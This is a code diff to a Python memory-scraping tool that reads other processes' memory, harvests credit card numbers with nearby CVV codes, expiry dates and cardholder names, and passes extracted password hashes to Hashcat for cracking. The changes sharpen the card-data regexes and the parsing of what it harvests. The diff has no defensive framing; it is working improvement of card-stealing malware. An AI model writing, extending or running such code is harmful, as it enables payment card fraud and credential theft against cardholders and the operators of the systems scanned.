@@ -7,7 +7,6 @@ import sys
 import time
 import logging
 import subprocess
-import os
 
 # Constants for process access
 PROCESS_VM_READ = 0x0010
@@ -34,9 +33,9 @@ def validate_luhn(card_number):
 
 # Regex patterns
 cc_regex = re.compile(r'\b(?:\d[ -]*?){13,19}\b')  # Credit card number
-cvv_regex = re.compile(r'\b\d{3,4}\b')  # CVV code (3 or 4 digits)
-expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/(?:\d{2}|\d{4})\b')  # Expiry date MM/YY or MM/YYYY
-name_regex = re.compile(r'\b[A-Z][a-z]+ [A-Z][a-z]+\b')  # Simple name pattern (First Last)
+cvv_regex = re.compile(r'\b(?:\d{3}|\d{4})\b')  # CVV code (3 or 4 digits)
+expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/?(\d{2}|\d{4})\b')  # Expiry date MM/YY or MM/YYYY
+name_regex = re.compile(r'\b[A-Z][a-z]+(?:\s[A-Z][a-z]+){1,2}\b')  # Improved name pattern (First Last or First Middle Last)
 hash_regex = re.compile(r'\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b')  # MD5, SHA1, SHA256
 
 # Hashcat command for cracking hashes
@@ -46,7 +45,6 @@ def crack_hash(hash_value):
         f.write(hash_value)
 
     # Construct the command to run Hashcat
-    # You need to have Hashcat installed and in your PATH for this to work
     command = ["hashcat", "-m", "0", "hash.txt", "path_to_your_wordlist.txt"]
 
     # Run the command
@@ -74,13 +72,13 @@ def scan_memory_chunk(memory_chunk):
             surrounding_text = memory_chunk[max(0, match_index - 200): match_index + 400]  # Extended search range
 
             # Find possible CVV, expiry date, and name nearby
-            cvv_match = cvv_regex.findall(surrounding_text)
-            expiry_match = expiry_regex.findall(surrounding_text)
+            cvv_matches = cvv_regex.findall(surrounding_text)
+            expiry_matches = expiry_regex.findall(surrounding_text)
             name_matches = name_regex.findall(surrounding_text)
 
             # Use the first matches found
-            cvv = cvv_match[0] if cvv_match else 'Not Found'
-            expiry = expiry_match[0] if expiry_match else 'Not Found'
+            cvv = cvv_matches[0] if cvv_matches else 'Not Found'
+            expiry = f"{expiry_matches[0][0]}/{expiry_matches[0][1]}" if expiry_matches else 'Not Found'
             name = name_matches[0] if name_matches else 'Not Found'
 
             results.append({
